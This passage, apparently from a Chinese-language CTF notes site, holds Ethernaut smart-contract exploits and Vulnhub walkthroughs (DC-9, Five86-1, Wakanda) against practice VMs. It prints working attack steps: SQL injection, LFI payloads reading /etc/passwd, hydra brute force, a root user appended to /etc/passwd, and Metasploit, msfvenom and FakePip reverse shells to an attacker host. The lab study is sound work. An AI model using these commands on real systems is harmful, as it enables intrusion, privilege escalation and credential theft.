gateTwo利用了 Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code. …… During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code. 也就是在调用构造函数合约时，地址生成但是代码还没有加到链上此时extcodersize=0,利用构造函数绕过 所以有如下exp pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } contract Attacker{ constructor(address p) public{ GatekeeperTwo target = GatekeeperTwo(p); bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)); target.enter(_gateKey); } } Naught Coin pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now > timeLock); _; } else { _; } } 这里提到了ERC20 Token标准，具体如下 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md 可以看到转账的实现有两个函数一个是transfer一个是transferFrom 这里没有对transferFrom进行重载所以没有lockTokens的限制， 我们只要approve自己，然后再利用transferForm转出去即可 (await contract.balanceOf(player)).toString() \"1000000000000000000000000\" await contract.approve(player,\"1000000000000000000000000\") await contract.transferFrom(player,contract.address,\"1000000000000000000000000\") (await contract.balanceOf(player)).toString() \"0\" Magic Number 参照EVM 函数部分 602a // v: push1 0x2a (value is 42) 6080 // p: push1 0x80 (memory slot is 0x80) 52 // mstore 6020 // s: push1 0x20 (value is 32 bytes in size) 6080 // p: push1 0x80 (value was stored in slot 0x80) f3 // return 10byte 调用部分 600a // s: push1 0x0a (10 bytes) 60?? // f: push1 0x?? (current position of runtime opcodes) 6000 // t: push1 0x00 (destination memory index 0) 39 // CODECOPY 600a // s: push1 0x0a (runtime opcode length) 6000 // p: push1 0x00 (access memory index 0) f3 // return to EVM 12byte 所以??部分为0x0c->12 结果为 600a600c600039600a6000f3602a60805260206080f3 var bytecode = \"0x600a600c600039600a6000f3602a60805260206080f3\"; await web3.eth.sendTransaction({ from: player, data: bytecode }, function(err,res){console.log(res)}); 得到合约地址后调用即可 await contract.setSolver(\"0x9E541a50c028ebeDD6e030c4138111b30bb23aF2\") © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"vulnhub/":{"url":"vulnhub/","title":"Vulnhub","keywords":"","body":"VulnhubVulnhub 渗透实践靶机集散地： © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"vulnhub/dc-9.html":{"url":"vulnhub/dc-9.html","title":"DC-9","keywords":"","body":"Vulnhub DC-9 靶机实战前言渗透记录参考资料Vulnhub DC-9 靶机实战 前言 最近看到同学在搞Vulnhub上的靶机，感觉很有意思，于是就自己试着下了个靶机整一整 相比于CTF线上赛题对某个或者某些知识点的考察，对靶机的渗透还是更综合和贴近实践的 整个过程可以说是一路遇坑（一开始虚拟网络NAT模式怎么都扫不到靶机。。。。最后直接无脑上桥接了） 不过也因此学到了很多工具的用法和一些fuzz技巧 渗透记录 首先用 arp-scan -l 扫一下靶机地址 返回 192.168.31.222 00:0c:29:3d:d1:6f VMware, Inc. 然后nmap扫一下服务 nmap -A 192.168.31.222 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 14:42 CST Nmap scan report for 192.168.31.222 Host is up (0.00034s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Example.com - Staff Details - Welcome MAC Address: 00:0C:29:3D:D1:6F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop 发现有个http服务 登陆是个管理界面可以查询 1' or '1'='1返回所有记录，存在注入点 用sqlmap跑一跑 sqlmap -r post.txt -p search --dbs [15:01:46] [INFO] fetching database names available databases [3]: [*] information_schema [*] Staff [*] users 先爆一下Users 只有一张表，表里的数据如下 Database: users Table: UserDetails [17 entries] +----+------------+---------------+---------------------+-----------+-----------+ | id | lastname | password | reg_date | username | firstname | +----+------------+---------------+---------------------+-----------+-----------+ | 1 | Moe | 3kfs86sfd | 2019-12-29 16:58:26 | marym | Mary | | 2 | Dooley | 468sfdfsd2 | 2019-12-29 16:58:26 | julied | Julie | | 3 | Flintstone | 4sfd87sfd1 | 2019-12-29 16:58:26 | fredf | Fred | | 4 | Rubble | RocksOff | 2019-12-29 16:58:26 | barneyr | Barney | | 5 | Cat | TC&TheBoyz | 2019-12-29 16:58:26 | tomc | Tom | | 6 | Mouse | B8m#48sd | 2019-12-29 16:58:26 | jerrym | Jerry | | 7 | Flintstone | Pebbles | 2019-12-29 16:58:26 | wilmaf | Wilma | | 8 | Rubble | BamBam01 | 2019-12-29 16:58:26 | bettyr | Betty | | 9 | Bing | UrAG0D! | 2019-12-29 16:58:26 | chandlerb | Chandler | | 10 | Tribbiani | Passw0rd | 2019-12-29 16:58:26 | joeyt | Joey | | 11 | Green | yN72#dsd | 2019-12-29 16:58:26 | rachelg | Rachel | | 12 | Geller | ILoveRachel | 2019-12-29 16:58:26 | rossg | Ross | | 13 | Geller | 3248dsds7s | 2019-12-29 16:58:26 | monicag | Monica | | 14 | Buffay | smellycats | 2019-12-29 16:58:26 | phoebeb | Phoebe | | 15 | McScoots | YR3BVxxxw87 | 2019-12-29 16:58:26 | scoots | Scooter | | 16 | Trump | Ilovepeepee | 2019-12-29 16:58:26 | janitor | Donald | | 17 | Morrison | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2 | Scott | +----+------------+---------------+---------------------+-----------+-----------+ 以为是管理页面的登录名和密码，但是试了一下发现不是。。。。。先放着 在Staff里发现了一条 Database: Staff Table: Users [1 entry] +--------+----------------------------------+----------+ | UserID | Password | Username | +--------+----------------------------------+----------+ | 1 | 856f5de590ef37314e7c3bdf6f8a66dc | admin | +--------+----------------------------------+----------+ 反查md5发现是 transorbital1 登上去以后发现能Add Record 最下方居然有个File does not exist 提醒我们是不是存在本地文件包含漏洞 试一下加个file参数 http://192.168.31.222/addrecord.php?file=../../../../../../../etc/passwd 发现底部果然返回了文件内容 都加x了,没啥用 再读一下../../../../../../../etc/shadow 读不出来，（想也没有权限。。。。 接下去怎么办呢 我们前面看nmap的时候发现还存在ssh服务 但是处于filter状态， 怎么连上ssh呢 了解到knock这种东西 knockd 监视一个预定义模式在iptables的日志, 例如一次击中端口6356,一次击中端口63356,两次击中端口9356, 这相当于敲一个关闭的门用一种特殊的暗码来被konckd识别, konckd 将使用iptables来打开一个预定义端口 例如ssh的22端口在一个预定定义时间.(比如一分钟),如果一个ssh session 在这个时间范围内打开,这个端口会一直保留.直到预定义时间过期后ssh端口被knockd关掉. 可以读到其配置文件 ../../../../../../../etc/knockd.conf [options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 所以我们只要这样就可以打开ssh了 root@kali:~# knock 192.168.31.222 7469 8475 9842 #对应sequence root@kali:~# nmap -p22 192.168.31.222 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 16:09 CST Nmap scan report for 192.168.31.222 Host is up (0.00031s latency). PORT STATE SERVICE 22/tcp open ssh MAC Address: 00:0C:29:3D:D1:6F (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds 用什么来连呢，还记得前面泄露的那张表吗 我们可以用hydra跑一跑 将用户名和密码分别放在users.txt和passwd.txt里 跑出来 [22][ssh] host: 192.168.31.222 login: chandlerb password: UrAG0D! [22][ssh] host: 192.168.31.222 login: joeyt password: Passw0rd [22][ssh] host: 192.168.31.222 login: janitor password: Ilovepeepee 然后就能连上ssh joeyt和chandlerb的账号上都没有找到有意思的东西 在janitor的账户上找到了更多的密码 janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts 接着放进hydra里跑一跑 多了一条 [22][ssh] host: 192.168.31.222 login: fredf password: B4-Tru3-001 常规sudo -l一下发现fredf可以执行一个程序 试一下执行 fredf@dc-9:~$ /opt/devstuff/dist/test/test Usage: python test.py read append 还是先看一下源码吧 根据经验，源码应该放在/dist的父目录里 fredf@dc-9:/opt/devstuff$ cat test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (\"Usage: python test.py read append\") sys.exit (1) else : f = open(sys.argv[1], \"r\") output = (f.read()) f = open(sys.argv[2], \"a\") f.write(output) f.close() 怎么利用这个脚本完成最后一步的提权呢？ 注意到test执行的时候是有root权限的， 而这个程序又刚好可以让我们任意写 所有我们可以利用这个脚本往/etc/passwd里写一个管理员用户即可 先说说shadow文件中第二列的格式，它是加密后的密码，它有些玄机，不同的特殊字符表示特殊的意义： 该列留空，即\"::\"，表示该用户没有密码。 该列为\"!\"，即\":!:\"，表示该用户被锁，被锁将无法登陆，但是可能其他的登录方式是不受限制的，如ssh公钥认证的方式，su的方式。 该列为\"\"，即\"::\"，也表示该用户被锁，和\"!“效果是一样的。 该列以”!“或”!!“开头，则也表示该用户被锁。 该列为”!!\"，即\":!!:\"，表示该用户从来没设置过密码。 如果格式为\"$id$salt$hashed\"，则表示该用户密码正常。其中​$id$的id表示密码的加密算法，$1$表示使用MD5算法，$2a$表示使用Blowfish算法，\"$2y$“是另一算法长度的Blowfish,”$5$“表示SHA-256算法，而”$6$\"表示SHA-512算法， 目前基本上都使用sha-512算法的，但无论是md5还是sha-256都仍然支持。$salt$是加密时使用的salt，hashed才是真正的密码部分。 如下构造用户密码段 fredf@dc-9:/opt/devstuff/dist/test$ openssl passwd -1 -salt eki 123456 $1$eki$6AfXWsJC4WDuk9MwHsLDY. eki:$1$eki$6AfXWsJC4WDuk9MwHsLDY.:0:0::/root:/bin/bash /tmp目录可写 我们就写到tmp里好了 Exp： echo 'eki:$1$eki$6AfXWsJC4WDuk9MwHsLDY.:0:0::/root:/bin/bash' >> /tmp/eki sudo test /tmp/eki /etc/passwd su eki 123456 然后就拿到theflag.txt啦！ 参考资料 LFI fuzz：https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/lfi /etc/passwd的结构：https://blog.csdn.net/dearsq/article/details/52586320 /etc/passwd 密码段的生成方式：https://blog.csdn.net/jiajiren11/article/details/80376371 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"vulnhub/five86-1.html":{"url":"vulnhub/five86-1.html","title":"five86-1","keywords":"","body":"Five86-1 靶机实践0x01 渗透实践Five86-1 靶机实践 0x01 渗透实践 nmap扫一下开了22和80， 80界面是个OpenNetAdmin 翻下Exploit-db,刚好有对应版本的metasploit exp,下载下来搞一搞 msfdb init msfconsole msf5 > use exploit/47772 msf5 exploit(47772) > set rhost 192.168.31.179 rhost => 192.168.31.179 msf5 exploit(47772) > set lhost 192.168.31.51 lhost => 192.168.31.51 msf5 exploit(47772) > exploit [*] Started reverse TCP handler on 192.168.31.51:4444 [*] Exploiting... [*] Sending stage (985320 bytes) to 192.168.31.179 [*] Meterpreter session 1 opened (192.168.31.51:4444 -> 192.168.31.179:59022) at 2020-02-27 21:29:15 +0800 [*] Command Stager progress - 100.14% done (706/705 bytes) meterpreter > 接下来就是慢慢看突破点了 home下目录进不去 找到/var/www下有.htpasswd 大概就是用来保存一个用户，网站只能得到该用户的权限 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1 # To make things slightly less painful (a standard dictionary will likely fail), # use the following character set for this 10 character password: aefhrt 还贴心了给了提示，方便你构造爆破字典。。。 root@kali:~/five86# crunch 10 10 aefhrt > dic.txt Crunch will now generate the following amount of data: 665127936 bytes 634 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 60466176 root@kali:~/five86# root@kali:~/five86# echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > hash root@kali:~/five86# john --wordlist=/root/five86/dic.txt hash 爆破拿到fatherrrrr (douglas) meterpreter > shell Process 2331 created. Channel 4 created. python -c \"import pty;pty.spawn('/bin/bash')\" www-data@five86-1:~$ su douglas su douglas Password: fatherrrrr douglas@five86-1:/var/www$ sudo -l看一下 douglas@five86-1:~$ sudo -l sudo -l Matching Defaults entries for douglas on five86-1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User douglas may run the following commands on five86-1: (jen) NOPASSWD: /bin/cp 那么我们可以利用jen的权限往他目录下的./ssh添加我们的authorized_keys，就能连接到他的账号了 cat id_rsa.pub > /tmp/authorized_keys cd /tmp chmod 777 authorized_keys sudo -u jen /bin/cp authorized_keys /home/jen/.ssh cd .ssh cp id_rsa /tmp cd /tmp chmod 600 id_rsa ssh -i id_rsa jen@localhost 注意id_rsa的文件权限要设置为600,不然会提示 Permissions 0777 for 'id_rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"id_rsa\": bad permissions 登上去sudo -l发现需要密码 其实登陆时有个提示是 You have new mail. 去读下邮件 找到 But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire! 现在我们可以登陆Moss的账号了 sudo -l无果， 看下SUID moss@five86-1:/var/mail$ find / -perm -u=s -type f 2>/dev/null find / -perm -u=s -type f 2>/dev/null /usr/bin/newgrp /usr/bin/passwd /usr/bin/chsh /usr/bin/su /usr/bin/umount /usr/bin/mount /usr/bin/sudo /usr/bin/gpasswd /usr/bin/chfn /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/sbin/exim4 /home/moss/.games/upyourgame 最后一个很有意思 moss@five86-1:/var/mail$ /home/moss/.games/upyourgame /home/moss/.games/upyourgame Would you like to play a game? yes yes Could you please repeat that? yes yes Nope, you'll need to enter that again. yes yes You entered: No. Is this correct? no no We appear to have a problem? Do we have a problem? no no Made in Britain. # id id uid=0(root) gid=1001(moss) groups=1001(moss) 看到#试了一下，发现莫名其妙的就已经拿到了root权限。。。。 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"vulnhub/wakanda.html":{"url":"vulnhub/wakanda.html","title":"wakanda","keywords":"","body":"Wakanda 靶机实践0x01 渗透过程Wakanda 靶机实践 0x01 渗透过程 arp-scan-l得到靶机地址192.168.31.154 信息搜集 nmap -A -p- 192.168.31.154 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 15:18 CST Nmap scan report for 192.168.31.154 Host is up (0.00041s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Vibranium Market 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 40963/tcp status | 100024 1 41052/udp status | 100024 1 52522/tcp6 status |_ 100024 1 57819/udp6 status 3333/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA) | 2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA) | 256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA) |_ 256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519) 40963/tcp open status 1 (RPC #100024) MAC Address: 08:00:27:78:4B:17 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 访问一下web服务 看一下源代码 发现有个lang参数 存在LFI漏洞 payload=/?lang=php://filter/convert.base64-encode/resource=index 先读一下已知文件的源码 Tips: 读取对应文件可以用如下命令行简化操作 curl http://192.168.xxx.xxx/?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d > index.php //index.php Vibranium Market Vibranium Market Home Fr/a> --> Coming soon Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned! Learn more Made by@mamadou //fr.php 拿到一个不知道用在哪的密码 $password =\"Niamey4Ever227!!!\" ;//I have to remember it 试一下ssh(nmap中扫出的端口号是3333) 成功连上去了 发现是个python命令行 拿到第一个flag You are now leaving help and returning to the Python interpreter. If you want to ask for help on a particular object directly from the interpreter, you can type \"help(object)\". Executing \"help('string')\" has the same effect as typing a particular string at the help> prompt. >>> os.system(\"ls\") Traceback (most recent call last): File \"\", line 1, in NameError: name 'os' is not defined >>> import os >>> os.system(\"ls\") flag1.txt 0 >>> os.system(\"cat fla*\") Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc 0 或者也可利用下面命令切换到熟悉的bash环境 import pty pty.spawn(\"/bin/bash\") 遗憾的是这个用户并不能sudo mamadou@Wakanda1:~$ sudo -l [sudo] password for mamadou: Sorry, user mamadou may not run sudo on Wakanda1. /home目录下还有个用户devops Tips: 可以利用 find / -user devops 2>/dev/null 其中2>/dev/null是不显示出错（权限不足）的提示信息 发现/srv/.antivirus.py是可写的 如果会定时执行的化就可以写个反弹shell了 可以用msfvenom自动生成脚本 msfvenom -p cmd/unix/reverse_python lhost= lport=2333 R 写入之后过一段时间我们就能连上主机了（以devops的身份 nc -lvp 2333 listening on [any] 2333 ... 192.168.31.154: inverse host lookup failed: Unknown host connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 34839 j /bin/bash: line 1: j: command not found ls bin boot dev etc home initrd.img lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz 在/home/devops下拿到flag2.txt 最后一步就是提权到root了 sudo -l Matching Defaults entries for devops on Wakanda1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User devops may run the following commands on Wakanda1: (ALL) NOPASSWD: /usr/bin/pip sudo -l发现我们可以用 /usr/bin/pip 关于这个命令 有Fakepip这个工具可以利用 root@kali:~# git clone https://github.com/0x00-0x00/FakePip.git Cloning into 'FakePip'... remote: Enumerating objects: 23, done. remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23 Unpacking objects: 100% (23/23), done. root@kali:~# cd FakePip/ root@kali:~/FakePip# vim setup.py 因为服务器上没有git,根据对应地址修改脚本然后再利用攻击机的web服务上传到服务器上 root@kali:~/FakePip# python -m SimpleHTTPServer 80 wget /setup.py 或者也可以复制脚本内容“手工上传”到靶机上 利用exp提供的方法可以获得root的反弹shell sudo /usr/bin/pip install . --upgrade --force-reinstall Unpacking /home/devops Running setup.py (path:/tmp/pip-GX4_KQ-build/setup.py) egg_info for package from file:///home Installing collected packages: FakePip Found existing installation: FakePip 0.0.1 Uninstalling FakePip: Successfully uninstalled FakePip Running setup.py install for FakePip nc -lvp 13372 #攻击机 listening on [any] 13372 ... 192.168.31.154: inverse host lookup failed: Unknown host connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 35263 root@Wakanda1:/tmp/pip-GX4_KQ-build# cat /root/root.txt 提权成功 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "}}